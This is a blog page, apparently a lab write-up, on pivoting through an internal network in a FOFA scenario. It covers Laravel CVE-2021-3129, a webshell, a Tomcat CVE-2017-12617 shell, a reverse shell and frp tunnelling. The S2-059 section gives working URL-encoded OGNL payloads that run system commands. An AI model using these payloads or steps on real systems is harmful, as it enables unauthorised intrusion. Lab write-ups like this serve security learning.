@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>fofa场景——内网死角WP | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="入口 入口是CVE-2021-3129，也就是Laravel Debug页面RCE，这里主要是搞内网。脚本一把梭了上传webshell。哥斯拉连">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/158/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/158/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="fofa场景——内网死角WP" />
+<meta property="og:description" content="入口 入口是CVE-2021-3129，也就是Laravel Debug页面RCE，这里主要是搞内网。脚本一把梭了上传webshell。哥斯拉连" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/158/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-06T11:20:01+00:00" />
+<meta property="article:modified_time" content="2022-02-06T11:20:01+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="fofa场景——内网死角WP"/>
+<meta name="twitter:description" content="入口 入口是CVE-2021-3129，也就是Laravel Debug页面RCE，这里主要是搞内网。脚本一把梭了上传webshell。哥斯拉连"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "fofa场景——内网死角WP",
+      "item": "https://a10nggg.github.io/archives/158/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "fofa场景——内网死角WP",
+  "name": "fofa场景——内网死角WP",
+  "description": "入口 入口是CVE-2021-3129，也就是Laravel Debug页面RCE，这里主要是搞内网。脚本一把梭了上传webshell。哥斯拉连",
+  "keywords": [
+    
+  ],
+  "articleBody": "入口 入口是CVE-2021-3129，也就是Laravel Debug页面RCE，这里主要是搞内网。脚本一把梭了上传webshell。哥斯拉连接上。\n{.wp-editor-md-post-content-link}\n内网探测 查看内网网段。没有关于网络的命令。\n只有翻文件。在/etc/hosts文件里看到两个网段。\n{.wp-editor-md-post-content-link}\n查看phpinfo界面得到一个网段.\n{.wp-editor-md-post-content-link}\n查看arp\n{.wp-editor-md-post-content-link}\n找内网网段还有没有其他方法，希望师傅多多指教一下。\n上传fscan提示权限不够，无法发送icmp包。只有挂代理扫内网了。\n{.wp-editor-md-post-content-link}\n上传web代理🐎，用IISPutScanner进行内网探测。\n{.wp-editor-md-post-content-link}\ntmocat 发现内网ip 192.120.4.2 端口为8080\n查看tmocat版本为8.5.19\n{.wp-editor-md-post-content-link}\n根据版本发现漏洞为CVE-2017-12617\n拿到shell\n{.wp-editor-md-post-content-link}\n反弹shell到公网服务器上。\n查看/etc/hosts\n又发现一个新网段。\n192.120.1.0/24\n然后继续跟进。用wget传frp到机器上，还好这机器出网，不然得搭两层代理了。\n{.wp-editor-md-post-content-link}\nS2-059 挂上代理继续用IISPutScanner扫描这个段。\n在内网发现http://192.120.1.3:8080/index.action\n存在struts2-059漏洞\n用poc验证，存在该漏洞。但是这个机器不出网。\nPOST:\nskillName=%25%7b%31%30%32%30%2b%34%7d\n{.wp-editor-md-post-content-link}\n人麻了我丢。打了半天是windowns机器。\nPOST:\nskillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('dir').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7D\n{.wp-editor-md-post-content-link}\n",
+  "wordCount" : "514",
+  "inLanguage": "en",
+  "datePublished": "2022-02-06T11:20:01Z",
+  "dateModified": "2022-02-06T11:20:01Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/158/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      fofa场景——内网死角WP
+    </h1>
+    <div class="post-meta"><span title='2022-02-06 11:20:01 +0000 +0000'>February 6, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="入口">入口<a hidden class="anchor" aria-hidden="true" href="#入口">#</a></h1>
+<p>入口是CVE-2021-3129，也就是Laravel Debug页面RCE，这里主要是搞内网。脚本一把梭了上传webshell。哥斯拉连接上。</p>
+<p><a href="/uploads/2022/02/wp_editor_md_9e68d302fcab188ad852a9300760ce64.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_9e68d302fcab188ad852a9300760ce64.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="内网探测">内网探测<a hidden class="anchor" aria-hidden="true" href="#内网探测">#</a></h1>
+<p>查看内网网段。没有关于网络的命令。<br>
+只有翻文件。在/etc/hosts文件里看到两个网段。<br>
+<a href="/uploads/2022/02/wp_editor_md_5ea3b7e0d8cef608e94290892c765061.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_5ea3b7e0d8cef608e94290892c765061.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+查看phpinfo界面得到一个网段.<br>
+<a href="/uploads/2022/02/wp_editor_md_62943d4941e385ec97b901c4f32b185c.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_62943d4941e385ec97b901c4f32b185c.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+查看arp<br>
+<a href="/uploads/2022/02/wp_editor_md_29676aef963067ff2f405b64a61195e4.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_29676aef963067ff2f405b64a61195e4.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+找内网网段还有没有其他方法，希望师傅多多指教一下。<br>
+上传fscan提示权限不够，无法发送icmp包。只有挂代理扫内网了。<br>
+<a href="/uploads/2022/02/wp_editor_md_5ef67dcd8e43b84bad2ebbd43644c52b.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_5ef67dcd8e43b84bad2ebbd43644c52b.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+上传web代理🐎，用IISPutScanner进行内网探测。<br>
+<a href="/uploads/2022/02/wp_editor_md_3c54d2b44ac89fd72aa89d9d48ba54cd.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_3c54d2b44ac89fd72aa89d9d48ba54cd.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="tmocat">tmocat<a hidden class="anchor" aria-hidden="true" href="#tmocat">#</a></h1>
+<p>发现内网ip 192.120.4.2 端口为8080<br>
+查看tmocat版本为8.5.19<br>
+<a href="/uploads/2022/02/wp_editor_md_0258b482835742ae97e86b87cb79517f.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_0258b482835742ae97e86b87cb79517f.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+根据版本发现漏洞为CVE-2017-12617<br>
+拿到shell<br>
+<a href="/uploads/2022/02/wp_editor_md_6c14faac11b65b45c27f7857ae22ebac.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_6c14faac11b65b45c27f7857ae22ebac.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<p>反弹shell到公网服务器上。<br>
+查看/etc/hosts<br>
+又发现一个新网段。<br>
+192.120.1.0/24<br>
+然后继续跟进。用wget传frp到机器上，还好这机器出网，不然得搭两层代理了。<br>
+<a href="/uploads/2022/02/wp_editor_md_0619d4fd4aa1c29ad8286eeb0f0b07be.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_0619d4fd4aa1c29ad8286eeb0f0b07be.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="s2-059">S2-059<a hidden class="anchor" aria-hidden="true" href="#s2-059">#</a></h1>
+<p>挂上代理继续用IISPutScanner扫描这个段。<br>
+在内网发现http://192.120.1.3:8080/index.action<br>
+存在struts2-059漏洞<br>
+用poc验证，存在该漏洞。但是这个机器不出网。<br>
+POST:<br>
+<code>skillName=%25%7b%31%30%32%30%2b%34%7d</code><br>
+<a href="/uploads/2022/02/wp_editor_md_a47215c81bb326f47d58e89f03cfae2a.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_a47215c81bb326f47d58e89f03cfae2a.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}<br>
+人麻了我丢。打了半天是windowns机器。<br>
+POST:<br>
+<code>skillName=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('dir').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7D</code><br>
+<a href="/uploads/2022/02/wp_editor_md_2ba61264b84ea10e1f3609581bf6e8d5.jpg"><img loading="lazy" src="/uploads/2022/02/wp_editor_md_2ba61264b84ea10e1f3609581bf6e8d5.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
